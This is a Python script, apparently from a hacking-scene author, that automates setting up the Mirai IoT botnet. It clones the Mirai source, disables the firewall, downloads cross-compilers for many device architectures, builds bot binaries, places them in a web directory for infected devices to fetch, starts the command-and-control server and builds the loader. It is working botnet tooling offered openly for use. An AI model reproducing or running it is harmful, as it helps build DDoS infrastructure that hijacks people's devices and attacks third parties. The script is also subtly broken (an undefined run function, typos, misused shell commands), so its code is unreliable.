#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Execute command - python miraiai.py <120.0.0.1>
import subprocess,os,sys,random,time,urllib2,subprocess

''' 
                                    
                                     ███╗   ███╗██╗██████╗  █████╗ ██╗     █████╗ ██╗ 
                                     ████╗ ████║██║██╔══██╗██╔══██╗██║    ██╔══██╗██║ 
                                     ██╔████╔██║██║██████╔╝███████║██║    ███████║██║ 
                                     ██║╚██╔╝██║██║██╔══██╗██╔══██║██║    ██╔══██║██║ 
                                     ██║ ╚═╝ ██║██║██║  ██║██║  ██║██║    ██║  ██║██║ 
                                     ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝    ╚═╝  ╚═╝╚═╝ 
                                    
                          */ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \*
                          │              Mirai auto Installer, by jihadi                    │ 
                          │ · Made fore Narcotix & N00Dlez since they can't setup Mirai.    │
                          │ · Don't give this to ZoneHax or ~B1naryThaG0d~                  │
                          │ · This isn't a full setup, you still have to edit your configs. │
                          *\ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ /*
                          */ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \*
                          │                      [Credits]                                  │ 
                          │ · Jihadi ϗ, Drought, G0dzSoldiers                               │
                          │ · Contact: Jihadi@riseup.net // https://discord.me/Hackintosh   │
                          │ · @Jihadi4Potus | Youtube: https://goo.gl/d3n5yU                │ 
                          *\ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ /* 
               
━━━━━━━━━━━━━━━
[Release Notes]
━━━━━━━━━━━━━━━
>> This is my first python script, don't hate. <<
4/8/17
      · Added Y/n Function
      · Added Cross-Compile
      · Added goLang Paths and drivers
      · Added Auto ./build.sh debug telnet & release


━━━━━━━━━━━━━━━━━━━━
Title / Introduction 
━━━━━━━━━━━━━━━━━━━━
'''

print("\x1b[1m\x1b[93m⚠⚠⚠ \x1b[31mREAD \x1b[37m>\x1b[31m> \x1b[37mTHIS ISNT A FULL SETUP YOU STILL HAVE TO EDIT YOUR CONFIGS \x1b[93m⚠⚠⚠\x1b[0m")
time.sleep(5)
print("            \x1b[97mMirai Auto-Installer CNC, Database, Loader! \x1b[0m")
time.sleep(4)
print("                 \x1b[36mUpdating & Upgrading system \x1b[0m")
time.sleep(4)

'''
━━━━━━━━━━━━━━━━━━━━━━━━
Updating/upgraing system
━━━━━━━━━━━━━━━━━━━━━━━━
'''

run("sudo apt-get update -y")
run("sudo apt-get upgrade -y")
print("\x1b[33m✪ \x1b[92mDone updating system for mirai! \x1b[33m✪\x1b[0m")
time.sleep(3)

'''
━━━━━━━━━━━━━━━━━
Grep Mirai Source
━━━━━━━━━━━━━━━━━
'''

utils = raw_input("\x1b[97m[\x1b[1m\x1b[91m!¡\x1b[21m\x1b[97m] \x1b[36mGrep Mirai Source Code? \x1b[32mY\x1b[36m\x1b[31m/\x1b[37mn\x1b[36m - $ \x1b[0m")
if utils.lower() == "y":
    get_utils = True
else:
    get_utils = False    
    
utils = ["https://github.com/jgamblin/Mirai-Source-Code"]

for utils in utils:
    run("git clone " + utils + "")
 
'''
━━━━━━━━━━━━━━━━━━━━━━  
Installing Mirai Utils
━━━━━━━━━━━━━━━━━━━━━━
'''

time.sleep(2)
print("\x1b[90m[\x1b[94m*\x1b[90m] \x1b[36mInstalling Mirai Utils \x1b[90m[\x1b[94m*\x1b[90m]\x1b[0m")
run("sudo apt-get install gcc golang electric-fence sudo git mysql-server mysql-client phpmyadmin screen -y")
run("go get github.com/go-sql-driver/mysql")
run("go get github.com/mattn/go-shellwords")
run("/etc/ini.d/iptbales stop")
print("\x1b[33m✪ \x1b[92mDone Installing Utils \x1b[33m✪")
time.sleep(3)

'''
━━━━━━━━━━━━━━━━━━━
Installing Database
━━━━━━━━━━━━━━━━━━━
'''

print("\x1b[90m[\x1b[94m*\x1b[90m] \x1b[36mSetting up MySQL \x1b[90m[\x1b[94m*\x1b[90m]\x1b[0m")
run("/usr/bin/mysql_secure_installation")
time.sleep(3)
print("\x1b[90m[\x1b[94m*\x1b[90m] \x1b[36mInput your MySQL passwd \x1b[90m[\x1b[94m*\x1b[90m]\x1b[0m")
run("mysql -u root -p")
time.sleep(3)
print("\x1b[33m✪ \x1b[92mDone setting up MySQL \x1b[33m✪")

'''
━━━━━━━━━━  
Wget Links
━━━━━━━━━━
'''

wget = raw_input("\x1b[97m[\x1b[1m\x1b[91m!¡\x1b[21m\x1b[97m] \x1b[36mInstall Cross-Compilers? \x1b[32mY\x1b[36m\x1b[31m/\x1b[37mn\x1b[36m - $ \x1b[0m")
if wget.lower() == "y":
    wget = True
else:
    wget == False

if wget == False:
    run("rm -rf cross-compiler-*")
    
getwget = ['https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2']

ccs = ["cross-compiler-armv4l",
"cross-compiler-i586",
"cross-compiler-m68k",
"cross-compiler-mips",
"cross-compiler-mipsel",
"cross-compiler-powerpc",
"cross-compiler-sh4",
"cross-compiler-sparc",
"cross-compiler-armv6l"]
 
name = ["armv4l",
        "i586",
        "m68k",
        "mips",
        "mipsel",
        "powerpc",
        "sh4",
        "sparc",
        "armv6l"]
        
ck = ["mirai.arm7",
      "mirai.arm",
      "mirai.m68k",
      "mirai.mips",
      "mirai.mpsl",
      "mirai.ppc",
      "mirai.sh4",
      "mirai.x86"]

for wget in getwget:
    run("mkdir /etc/xcompile")
    run("wget " + wget + "")
    run("tar -xvf *tar.bz2")
    run("mv cross-compiler-*  /etc/xcompile")
print("\x1b[33m✪ \x1b[92mDone Installing Cross-Compilers \x1b[33m✪")

'''
━━━━━━━━━━━━━
GoLang Paths
━━━━━━━━━━━━━
'''

golang = raw_input("\x1b[97m[\x1b[1m\x1b[91m!¡\x1b[21m\x1b[97m] \x1b[36mExecute GoLang Paths? \x1b[32mY\x1b[36m\x1b[31m/\x1b[37mn\x1b[36m - $ \x1b[0m")
if golang.lower() == "y":    
    get_golang = True 
else:
    get_golang = False

if get_golang == True:
   run("export PATH=$PATH:/etc/xcompile/armv4l/bin")
   run("export PATH=$PATH:/etc/xcompile/armv6l/bin")
   run("export PATH=$PATH:/etc/xcompile/i586/bin")
   run("export PATH=$PATH:/etc/xcompile/m68k/bin")
   run("export PATH=$PATH:/etc/xcompile/mips/bin")
   run("export PATH=$PATH:/etc/xcompile/mipsel/bin")
   run("export PATH=$PATH:/etc/xcompile/powerpc/bin")
   run("export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin")
   run("export PATH=$PATH:/etc/xcompile/sh4/bin")
   run("export PATH=$PATH:/etc/xcompile/sparc/bin")
   run("export PATH=$PATH:/etc/xcompile/armv6l/bin") 
   run("export PATH=$PATH:/usr/local/go/bin")
   run("export GOPATH=$HOME/Documents/go")
print("\x1b[33m✪ \x1b[92mDone, executing goLang paths \x1b[33m✪")


'''
━━━━━━━━━━━━━━━━━━━━
Telnet/Release build
━━━━━━━━━━━━━━━━━━━━
'''

print("\x1b[90m[\x1b[94m*\x1b[90m] \x1b[36mBuilding Telnet/Release \x1b[90m[\x1b[94m*\x1b[90m]\x1b[0m")
run("cd /Mirai-Source-Code-master/mirai/")
run("./build.sh debug telnet")
run("./build.sh release telnet")
run("mv Mirai-Source-Code-master/mirai/prompt.txt Mirai-Source-Code-master/mirai/release/")
run("cd Mirai-Source-Code-master/mirai/release; mkdir /var/www/html/bins/; mv mirai.* miraint.* /var/www/html/bins") 


'''
━━━━━━━━━━━━
Starting CNC
━━━━━━━━━━━━
'''

print("\x1b[90m[\x1b[94m*\x1b[90m] \x1b[36mStarting Mirai! Congratz! \x1b[90m[\x1b[94m*\x1b[90m]\x1b[0m")
run("cd  Mirai-Source-Code-master/mirai/release/; screen ./cnc")


'''
━━━━━━━━━━━━━━━━━
Setting up loader
━━━━━━━━━━━━━━━━━
'''

loader = raw_input("\x1b[97m[\x1b[1m\x1b[91m!¡\x1b[21m\x1b[97m] \x1b[36mDo you want to setup loader? \x1b[32mY\x1b[36m\x1b[31m/\x1b[37mn\x1b[36m - $ \x1b[0m")
if loader.lower() == "y":

    get_loader = True

else:
    get_loader = False
    
if get_loader == True:

    print("\x1b[1m\x1b[93m⚠⚠⚠ \x1b[31mREAD \x1b[37m>\x1b[31m> \x1b[37mTHIS ISNT A FULL SETUP YOU STILL HAVE TO EDIT YOUR CONFIGS (main.c in dlrs) \x1b[93m⚠⚠⚠\x1b[0m")

    time.sleep(7)

    print("\x1b[90m[\x1b[94m*\x1b[90m] \x1b[36mSetting up loader Stand by \x1b[90m[\x1b[94m*\x1b[90m]\x1b[0m")

    run("cd Mirai-Source-Code-master/mirai/dlr")

    run("./build.sh")

    run("cp /Mirai-Source-Code-master/dlr/release/dlr.* /Mirai-Source-Code-master/loader/bins")

    print("\x1b[1m\x1b[93m⚠⚠⚠ \x1b[31mREAD \x1b[37m>\x1b[31m> \x1b[37mMake sure u Edit line 37 & 38 & line 53 in main.c \x1b[93m⚠⚠⚠\x1b[0m")

    time.sleep(7) 

    run("cd /Mirai-Source-Code-master/loader/src/; nano main.c")

'''
━━━━━━━━━━━━━━━━━
$ End of Script $
━━━━━━━━━━━━━━━━━
'''












